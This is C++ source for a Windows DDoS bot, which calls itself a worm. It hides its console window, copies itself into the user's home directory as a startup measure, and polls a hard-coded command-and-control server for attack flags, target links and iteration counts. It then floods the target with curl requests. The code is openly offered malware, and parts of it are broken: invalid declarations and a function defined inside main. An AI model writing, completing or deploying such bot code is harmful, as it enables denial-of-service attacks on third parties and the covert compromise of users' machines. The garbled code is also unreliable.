#include <bits/stdc++.h>
#include <windows.h>
#include <unistd.h>
#include <string>
#define SERVER_URL "https://zoocenter.bg"

using namespace std;

/*Initial Bot ID test

class BOTSIDS {
public :
    static int getUniqueId();
};

int BOTSIDS::getUniqueId() {
    static std::atomic<std::uint32_t> uid { 0 };
    return ++uid;
}

BOTSIDS obj;

void id = obj.obj; 

void id(){

string id_directory="\"%HOMEDRIVE%%HOMEPATH%\\%USER%";

string cmd_copy_id_directory="xcopy \".\\id.txt\" " + id_directory + "*\" /Y";
}

*/

void runInBackground();
void saveStartup(); 

string makeRequest(string method, string uri);
void startDDOS(string link, string iterations);

string randomString(int n);
string link;
string iterations;
string bot_id;

class BOTSIDS { // < ---  class to randomise a bot id, then save it //
public :
    static int getUniqueId();
};

int BOTSIDS::getUniqueId() {
    static std::atomic<std::uint32_t> uid { 0 };
    return ++uid;
}

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

int main()
{	

BOTSIDS obj;

void id = obj.obj; 

void id() { // <-- save function

string id_directory="\"%HOMEDRIVE%%HOMEPATH%\\%USER%";

string cmd_copy_id_directory="xcopy \".\\id.txt\" " + id_directory + "*\" /Y";
}
	
	
	string attackFlag;
	bot_id = randomString(6);
		
	// Run process in background
	runInBackground();
	
	// Save to startup
	saveStartup();

	// Life of worm begins here
	while(1) {
		attackFlag = makeRequest("GET", "attack.php?bot_id=" + bot_id);
		if(attackFlag == "1") {
			link		=	makeRequest("GET", "link.php");
			iterations	=	makeRequest("GET", "itr.php");
			startDDOS(link, iterations);
		}
		if(attackFlag != "1")
			sleep(200);
	}
	
	return 0;
}

/*
* =======================================================================================
* RUN AS BACKGROUND PROCESS -> return void
* =======================================================================================
*/
void runInBackground()
{
	HWND window;
	AllocConsole();
	window	=	FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}


/*
* =======================================================================================
* SAVE TO STARTUP FOLDER -> return void
* =======================================================================================
*/
void saveStartup()
{
		string startup_directory			=	"\"%HOMEDRIVE%%HOMEPATH%\\%USER%";
		string dir_place_worm				=	"\"%HOMEDRIVE%%HOMEPATH%\\%USER%" + "\\ddose.exe";
		string cmd_copy_worm_startup		=	"xcopy \".\\ddos.exe\" " + dir_place_worm + "*\" /Y";
		const char *cmd_copy_worm_startup_p	=	cmd_copy_worm_startup.c_str();
		
		system(cmd_copy_worm_startup_p);
}


/*
* =======================================================================================
* DDOS ATTACK FUNCTION -> return void
* =======================================================================================
*/
void startDDOS(string link, string iterations)
{	
	string ddos_cmd			=	"curl -s \"" + link + "?[0-" + iterations + "]\"";
	const char *ddos_cmd_p	=	ddos_cmd.c_str();
		
	system(ddos_cmd_p);
}


/*
* =======================================================================================
* MAKE REQUEST FUNCTION -> returns response string
* =======================================================================================
*/
string makeRequest(string method, string uri)
{
		string retval;
		string cmd_for_get_request			=	"curl -X "
												+ method
												+ " " + SERVER_URL +"/"
												+ uri;
		const char *cmd_for_get_request_p	=	cmd_for_get_request.c_str();
		
		return exec(cmd_for_get_request_p);
}


/*
* =======================================================================================
* -----------------------------UTIL FUNCTIONS HERE ONLY----------------------------------
* =======================================================================================
*/
string randomString(int n) 
{ 
    char alphabet[26] = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 
                          'h', 'i', 'j', 'k', 'l', 'm', 'n',  
                          'o', 'p', 'q', 'r', 's', 't', 'u', 
                          'v', 'w', 'x', 'y', 'z' }; 
  
    string res = ""; 
    for (int i = 0; i < n; i++)  
        res = res + alphabet[rand() % 26]; 
      
    return res; 
}
